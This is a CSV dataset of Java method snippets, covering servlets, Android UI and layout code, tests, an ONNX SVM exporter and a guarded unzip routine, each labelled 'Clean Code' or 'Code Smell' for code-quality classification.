text,label,text_label
"@Deprecated @Override protected void doGet(HttpServletRequest req,HttpServletResponse resp) throws IOException, ServletException {
  String userId=InputParser.getQueryParamOrThrowError(req,""userId"",true);
  String thirdPartyId=InputParser.getQueryParamOrThrowError(req,""thirdPartyId"",true);
  String thirdPartyUserId=InputParser.getQueryParamOrThrowError(req,""thirdPartyUserId"",true);
  if (userId != null && (thirdPartyId != null || thirdPartyUserId != null)) {
    throw new ServletException(new BadRequestException(""Please provide only one of userId or (thirdPartyId & thirdPartyUserId)""));
  }
  if (userId == null && (thirdPartyId == null || thirdPartyUserId == null)) {
    throw new ServletException(new BadRequestException(""Please provide one of userId or (thirdPartyId & thirdPartyUserId)""));
  }
  try {
    AuthRecipeUserInfo user=null;
    if (userId != null) {
      AppIdentifier appIdentifier=getAppIdentifier(req);
      try {
        StorageAndUserIdMapping storageAndUserIdMapping=this.enforcePublicTenantAndGetStorageAndUserIdMappingForAppSpecificApi(req,userId,UserIdType.ANY,true);
        if (storageAndUserIdMapping.userIdMapping != null) {
          userId=storageAndUserIdMapping.userIdMapping.superTokensUserId;
        }
        user=ThirdParty.getUser(appIdentifier,storageAndUserIdMapping.storage,userId);
        if (user != null) {
          UserIdMapping.populateExternalUserIdForUsers(appIdentifier,storageAndUserIdMapping.storage,new AuthRecipeUserInfo[]{user});
        }
      }
 catch (      UnknownUserIdException e) {
      }
    }
 else {
      TenantIdentifier tenantIdentifier=getTenantIdentifier(req);
      Storage storage=getTenantStorage(req);
      user=ThirdParty.getUser(tenantIdentifier,storage,thirdPartyId,thirdPartyUserId);
      if (user != null) {
        UserIdMapping.populateExternalUserIdForUsers(tenantIdentifier.toAppIdentifier(),storage,new AuthRecipeUserInfo[]{user});
      }
    }
    if (user == null) {
      JsonObject result=new JsonObject();
      result.addProperty(""status"",userId != null ? ""UNKNOWN_USER_ID_ERROR"" : ""UNKNOWN_THIRD_PARTY_USER_ERROR"");
      super.sendJsonResponse(200,result,resp);
    }
 else {
      JsonObject result=new JsonObject();
      result.addProperty(""status"",""OK"");
      JsonObject userJson=getVersionFromRequest(req).greaterThanOrEqualTo(SemVer.v4_0) ? user.toJson() : user.toJsonWithoutAccountLinking();
      if (getVersionFromRequest(req).lesserThan(SemVer.v3_0)) {
        userJson.remove(""tenantIds"");
      }
      result.add(""user"",userJson);
      super.sendJsonResponse(200,result,resp);
    }
  }
 catch (  StorageQueryException|TenantOrAppNotFoundException|BadPermissionException e) {
    throw new ServletException(e);
  }
}",1,Code Smell
"public List<List<String>> methodClusters(){
  if (keyBehaviorEntries.size() < 6) {
    return null;
  }
  List<String> methodNames=new ArrayList<>(keyBehaviorEntries.size());
  for (  KeyBehaviorEntry entry : keyBehaviorEntries) {
    methodNames.add(entry.getMethodName());
  }
  List<double[]> vectors=new ArrayList<>();
  Map<String,double[]> vectorMap=new HashMap<>();
  int maxLength=-1;
  for (  String methodName : methodNames) {
    if (methodName.length() > maxLength) {
      maxLength=methodName.length();
    }
  }
  for (  String methodName : methodNames) {
    double[] vector=new double[maxLength];
    for (int i=0; i < methodName.length(); i++) {
      vector[i]=methodName.charAt(i);
    }
    for (int i=methodName.length(); i < maxLength; i++) {
      vector[i]=0;
    }
    vectors.add(vector);
    vectorMap.put(methodName,vector);
  }
  KMeans kMeans=new KMeans();
  return kMeans.cluster(vectors,methodNames,vectorMap);
}",1,Code Smell
"private void refreshPcapDumpInfo(Context context){
  String info="""";
  Prefs.DumpMode mode=CaptureService.getDumpMode();
switch (mode) {
case NONE:
    info=getString(R.string.no_dump_info);
  break;
case HTTP_SERVER:
info=String.format(getResources().getString(R.string.http_server_status),Utils.getLocalIPAddress(mActivity),CaptureService.getHTTPServerPort());
break;
case PCAP_FILE:
info=getString(R.string.pcap_file_info);
String pcapFname=CaptureService.getPcapFname();
if (pcapFname != null) info=pcapFname;
break;
case UDP_EXPORTER:
info=String.format(getResources().getString(R.string.collector_info),CaptureService.getCollectorAddress(),CaptureService.getCollectorPort());
break;
}
mCollectorInfoText.setText(info);
Drawable drawable=null;
if ((mAppFilter != null) && (!mAppFilter.isEmpty())) {
Pair<String,Drawable> pair=getAppFilterTextAndIcon(context);
drawable=pair.second;
}
if (drawable != null) {
mCollectorInfoIcon.setImageDrawable(drawable);
mCollectorInfoIcon.setVisibility(View.VISIBLE);
}
 else mCollectorInfoIcon.setVisibility(View.GONE);
}
",0,Clean Code
"private boolean typeEquals(String[] types1s,String[] types2s){
  if (Arrays.equals(types1s,types2s)) {
    return true;
  }
  if (types1s == null || types2s == null) {
    return false;
  }
  if (types1s.length != types2s.length) {
    return false;
  }
  for (int i=0; i < types1s.length; i++) {
    String type1=types1s[i];
    String type2=types2s[i];
    if (StringUtils.equalsIgnoreCase(type1,type2)) {
      continue;
    }
    if (type1 != null && type2 != null) {
      if (type1.contains(""java.util"") && type2.contains(""java.util"")) {
        try {
          Class type1Class=Class.forName(type1);
          Class type2Class=Class.forName(type2);
          boolean ret=(type1Class == type2Class) || type1Class.isAssignableFrom(type2Class) || type2Class.isAssignableFrom(type1Class);
          if (!ret) {
            return false;
          }
          continue;
        }
 catch (        Exception e) {
        }
      }
    }
    return false;
  }
  return true;
}",1,Code Smell
"private void handleClientMessage(ChannelInfo channelInfo,JSONObject message,String messageRaw){
  try {
    String requestName=null;
    if (message.has(""name"") && !message.isNull(""name"")) {
      requestName=(String)message.get(""name"");
    }
    if (requestName == null) {
      LOGGER.error(""No request name could be found in client message: {}"",messageRaw);
      return;
    }
    handleWithClientRequestHandler(channelInfo,message,messageRaw,requestName);
  }
 catch (  Exception exception) {
    LOGGER.error(""Error occurred while handling client message: {}"",messageRaw,exception);
    handleError(channelInfo,message,exception);
  }
}
",0,Clean Code
"@Override public void addItem(Object item,int index,int length,int rowIndex,int edge){
  View v=(View)item;
  int start, end;
  if (edge == Integer.MIN_VALUE || edge == Integer.MAX_VALUE) {
    edge=!mGrid.isReversedFlow() ? mWindowAlignment.mainAxis().getPaddingMin() : mWindowAlignment.mainAxis().getSize() - mWindowAlignment.mainAxis().getPaddingMax();
  }
  boolean edgeIsMin=!mGrid.isReversedFlow();
  if (edgeIsMin) {
    start=edge;
    end=edge + length;
  }
 else {
    start=edge - length;
    end=edge;
  }
  int startSecondary=getRowStartSecondary(rowIndex) + mWindowAlignment.secondAxis().getPaddingMin() - mScrollOffsetSecondary;
  mChildrenStates.loadView(v,index);
  layoutChild(rowIndex,v,start,end,startSecondary);
  if (DEBUG) {
    Log.d(getTag(),""addView "" + index + "" ""+ v);
  }
  if (TRACE)   TraceCompat.endSection();
  if (!mState.isPreLayout()) {
    updateScrollLimits();
  }
  if ((mFlag & PF_STAGE_MASK) != PF_STAGE_LAYOUT && mPendingMoveSmoothScroller != null) {
    mPendingMoveSmoothScroller.consumePendingMovesAfterLayout();
  }
  if (mChildLaidOutListener != null) {
    RecyclerView.ViewHolder vh=mBaseGridView.getChildViewHolder(v);
    mChildLaidOutListener.onChildLaidOut(mBaseGridView,v,index,vh == null ? NO_ID : vh.getItemId());
  }
}
",0,Clean Code
"/** 
 * Adds messages list in chronological order. Use this method to add history.
 * @param messages messages from history.
 * @param reverse  {@code true} if need to reverse messages before adding.
 */
public void addToEnd(List<MESSAGE> messages,boolean reverse){
  if (messages == null || messages.isEmpty())   return;
  if (reverse)   Collections.reverse(messages);
  removeLoadingMessageIfNeeded();
  if (!items.isEmpty()) {
    int lastItemPosition=items.size() - 1;
    if (items.get(lastItemPosition).item instanceof Date) {
      Date lastItem=(Date)items.get(lastItemPosition).item;
      if (DateFormatter.isSameDay(messages.get(0).getCreatedAt(),lastItem)) {
        items.remove(lastItemPosition);
        notifyItemRemoved(lastItemPosition);
      }
    }
  }
  int oldSize=items.size();
  generateDateHeaders(messages);
  notifyItemRangeInserted(oldSize,items.size() - oldSize);
}",1,Code Smell
"@Test public void testUpdateChannel_success(){
  PayChannelDO dbChannel=randomPojo(PayChannelDO.class,o -> {
    o.setCode(PayChannelEnum.ALIPAY_APP.getCode());
    o.setConfig(randomAlipayPayClientConfig());
  }
);
  channelMapper.insert(dbChannel);
  AlipayPayClientConfig config=randomAlipayPayClientConfig();
  PayChannelUpdateReqVO reqVO=randomPojo(PayChannelUpdateReqVO.class,o -> {
    o.setId(dbChannel.getId());
    o.setStatus(randomCommonStatus());
    o.setConfig(JsonUtils.toJsonString(config));
  }
);
  channelService.updateChannel(reqVO);
  PayChannelDO channel=channelMapper.selectById(reqVO.getId());
  assertPojoEquals(reqVO,channel,""config"");
  assertPojoEquals(config,channel.getConfig());
  assertNull(channelService.getClientCache().getIfPresent(channel.getId()));
}
",0,Clean Code
"@Override public ONNXNode writeONNXGraph(ONNXRef<?> input){
  ONNXContext onnx=input.onnxContext();
  svm_model model=models.get(0);
  int numOneVOne=model.label.length * (model.label.length - 1) / 2;
  int numFeatures=featureIDMap.size();
  Map<String,Object> attributes=new HashMap<>();
  attributes.put(""classlabels_ints"",model.label);
  float[] coefficients=new float[model.l * (model.nr_class - 1)];
  for (int i=0; i < model.nr_class - 1; i++) {
    for (int j=0; j < model.l; j++) {
      coefficients[i * model.l + j]=(float)model.sv_coef[i][j];
    }
  }
  attributes.put(""coefficients"",coefficients);
  attributes.put(""kernel_params"",new float[]{(float)model.param.gamma,(float)model.param.coef0,model.param.degree});
  attributes.put(""kernel_type"",KernelType.getKernelType(model.param.kernel_type).name());
  float[] rho=new float[model.rho.length];
  for (int i=0; i < rho.length; i++) {
    rho[i]=(float)-model.rho[i];
  }
  attributes.put(""rho"",rho);
  float[] supportVectors=new float[model.l * numFeatures];
  for (int j=0; j < model.l; j++) {
    svm_node[] sv=model.SV[j];
    for (    svm_node svm_node : sv) {
      int idx=(j * numFeatures) + svm_node.index;
      supportVectors[idx]=(float)svm_node.value;
    }
  }
  attributes.put(""support_vectors"",supportVectors);
  attributes.put(""vectors_per_class"",Arrays.copyOf(model.nSV,model.label.length));
  if (generatesProbabilities) {
    attributes.put(""prob_a"",Arrays.copyOf(Util.toFloatArray(model.probA),numOneVOne));
    attributes.put(""prob_b"",Arrays.copyOf(Util.toFloatArray(model.probB),numOneVOne));
  }
  List<ONNXNode> outputs=input.apply(ONNXOperators.SVM_CLASSIFIER,Arrays.asList(""pred_label"",""svm_output""),attributes);
  ONNXNode predLabel=outputs.get(0);
  ONNXNode svmOutput=outputs.get(1);
  ONNXNode ungatheredOutput=svmOutput;
  if (!generatesProbabilities) {
    if (model.nr_class == 2) {
      ONNXInitializer negOne=onnx.constant(""minus_one"",-1.0f);
      ungatheredOutput=writeDecisionFunction(svmOutput.apply(ONNXOperators.MUL,negOne));
    }
 else {
      ungatheredOutput=writeDecisionFunction(svmOutput);
    }
  }
  int[] backwardsLibSVMMapping=new int[model.label.length];
  for (int i=0; i < model.label.length; i++) {
    backwardsLibSVMMapping[model.label[i]]=i;
  }
  ONNXInitializer indices=onnx.array(""label_indices"",backwardsLibSVMMapping);
  return ungatheredOutput.apply(ONNXOperators.GATHER,indices,Collections.singletonMap(""axis"",1));
}",1,Code Smell
"@Override public boolean initOnce(){
  try {
    Method handleNightMask=DexKit.doFindMethod(DexKit.N_BASE_CHAT_PIE__handleNightMask);
    XposedBridge.hookMethod(handleNightMask,new XC_MethodHook(49){
      Field fMask=null;
      @Override protected void afterHookedMethod(      MethodHookParam param) throws Throwable {
        if (LicenseStatus.sDisableCommonHooks) {
          return;
        }
        if (!isEnabled()) {
          return;
        }
        if (fMask == null) {
          DexFieldDescriptor desc=FindNightMask.getNightMaskField();
          if (desc == null) {
            loge(""FindNightMask/E getNightMaskField return null"");
            return;
          }
          fMask=desc.getFieldInstance(Initiator.getHostClassLoader());
          if (fMask != null) {
            fMask.setAccessible(true);
          }
        }
        if (fMask != null) {
          Object chatPie=param.thisObject;
          View mask=(View)fMask.get(chatPie);
          if (mask != null) {
            mask.setVisibility(View.GONE);
          }
        }
      }
    }
);
    return true;
  }
 catch (  Throwable e) {
    log(e);
    return false;
  }
}",0,Clean Code
"/** 
 * Unzips a zip file from an input stream to  {@code destDir}.
 * @throws UncheckedIOException if an IO exception occurs
 */
public static void unzip(InputStream input,Path destDir){
  int totalSizeArchive=0;
  int totalEntryArchive=0;
  try (var zip=new ZipInputStream(input)){
    ZipEntry entry;
    while ((entry=zip.getNextEntry()) != null) {
      Path targetDirResolved=destDir.resolve(entry.getName());
      Path destination=targetDirResolved.normalize();
      if (!destination.startsWith(destDir)) {
        throw new IOException(""Bad zip entry: "" + entry.getName());
      }
      if (entry.isDirectory()) {
        FileUtils.createDirectory(destDir);
      }
 else {
        createParentDirectories(destination);
        int nBytes;
        byte[] buffer=new byte[2048];
        int totalSizeEntry=0;
        try (var out=Files.newOutputStream(destination,StandardOpenOption.CREATE_NEW,WRITE)){
          totalEntryArchive++;
          while ((nBytes=zip.read(buffer)) > 0) {
            out.write(buffer,0,nBytes);
            totalSizeEntry+=nBytes;
            totalSizeArchive+=nBytes;
            double compressionRatio=totalSizeEntry * 1d / entry.getCompressedSize();
            if (compressionRatio > ZIP_THRESHOLD_RATIO) {
              throw new IOException(""Ratio between compressed and uncompressed data is highly suspicious "" + FORMAT.numeric(compressionRatio) + ""x, looks like a Zip Bomb Attack"");
            }
          }
          if (totalSizeArchive > ZIP_THRESHOLD_SIZE) {
            throw new IOException(""The uncompressed data size "" + FORMAT.storage(totalSizeArchive) + ""B is too much for the application resource capacity"");
          }
          if (totalEntryArchive > ZIP_THRESHOLD_ENTRIES) {
            throw new IOException(""Too many entries in this archive "" + FORMAT.integer(totalEntryArchive) + "", can lead to inodes exhaustion of the system"");
          }
        }
       }
    }
  }
 catch (  IOException e) {
    throw new UncheckedIOException(e);
  }
}",1,Code Smell
"@Override protected boolean appendVisibleItemsWithoutCache(int toLimit,boolean oneColumnMode){
  final int count=mProvider.getCount();
  int itemIndex;
  int rowIndex;
  int edgeLimit;
  boolean edgeLimitIsValid;
  if (mLastVisibleIndex >= 0) {
    if (mLastVisibleIndex < getLastIndex()) {
      return false;
    }
    itemIndex=mLastVisibleIndex + 1;
    rowIndex=getLocation(mLastVisibleIndex).row;
    int edgeLimitSearchIndex=findRowEdgeLimitSearchIndex(true);
    if (edgeLimitSearchIndex < 0) {
      edgeLimit=Integer.MIN_VALUE;
      for (int i=0; i < mNumRows; i++) {
        edgeLimit=mReversedFlow ? getRowMin(i) : getRowMax(i);
        if (edgeLimit != Integer.MIN_VALUE) {
          break;
        }
      }
    }
 else {
      edgeLimit=mReversedFlow ? findRowMin(false,edgeLimitSearchIndex,null) : findRowMax(true,edgeLimitSearchIndex,null);
    }
    if (mReversedFlow ? getRowMin(rowIndex) <= edgeLimit : getRowMax(rowIndex) >= edgeLimit) {
      rowIndex=rowIndex + 1;
      if (rowIndex == mNumRows) {
        rowIndex=0;
        edgeLimit=mReversedFlow ? findRowMin(false,null) : findRowMax(true,null);
      }
    }
    edgeLimitIsValid=true;
  }
 else {
    itemIndex=mStartIndex != START_DEFAULT ? mStartIndex : 0;
    rowIndex=(mLocations.size() > 0 ? getLocation(getLastIndex()).row + 1 : itemIndex) % mNumRows;
    edgeLimit=0;
    edgeLimitIsValid=false;
  }
  boolean filledOne=false;
  while (true) {
    for (; rowIndex < mNumRows; rowIndex++) {
      if (itemIndex == count || (!oneColumnMode && checkAppendOverLimit(toLimit))) {
        return filledOne;
      }
      int location=mReversedFlow ? getRowMin(rowIndex) : getRowMax(rowIndex);
      if (location == Integer.MAX_VALUE || location == Integer.MIN_VALUE) {
        if (rowIndex == 0) {
          location=mReversedFlow ? getRowMin(mNumRows - 1) : getRowMax(mNumRows - 1);
          if (location != Integer.MAX_VALUE && location != Integer.MIN_VALUE) {
            location=location + (mReversedFlow ? -mSpacing : mSpacing);
          }
        }
 else {
          location=mReversedFlow ? getRowMax(rowIndex - 1) : getRowMin(rowIndex - 1);
        }
      }
 else {
        location=location + (mReversedFlow ? -mSpacing : mSpacing);
      }
      int size=appendVisibleItemToRow(itemIndex++,rowIndex,location);
      filledOne=true;
      if (edgeLimitIsValid) {
        while (mReversedFlow ? location - size > edgeLimit : location + size < edgeLimit) {
          if (itemIndex == count || (!oneColumnMode && checkAppendOverLimit(toLimit))) {
            return filledOne;
          }
          location=location + (mReversedFlow ? -size - mSpacing : size + mSpacing);
          size=appendVisibleItemToRow(itemIndex++,rowIndex,location);
        }
      }
 else {
        edgeLimitIsValid=true;
        edgeLimit=mReversedFlow ? getRowMin(rowIndex) : getRowMax(rowIndex);
      }
    }
    if (oneColumnMode) {
      return filledOne;
    }
    edgeLimit=mReversedFlow ? findRowMin(false,null) : findRowMax(true,null);
    rowIndex=0;
  }
}",1,Code Smell
